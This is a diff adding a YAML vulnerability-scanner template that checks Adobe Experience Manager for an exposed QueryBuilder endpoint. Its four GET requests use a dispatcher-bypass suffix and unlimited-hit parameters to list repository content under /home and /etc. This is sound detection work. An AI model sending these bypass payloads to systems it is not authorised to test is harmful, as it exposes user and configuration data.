@@ -1,0 +1,34 @@
+id: aem-querybuilder-internal-path-read
+name: AEM QueryBuilder Internal Path Read
+severity: medium
+confidence: tentative
+description: AEM QueryBuilder is vulnerable to LFI.
+reference: https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91
+tags:
+- aem
+- misconfig
+- vuln
+requests:
+- method: GET
+  path: /bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1
+  matchers: &id001
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - jcr:path
+    - success
+  condition: and
+- method: GET
+  path: /bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1
+  matchers: *id001
+  condition: and
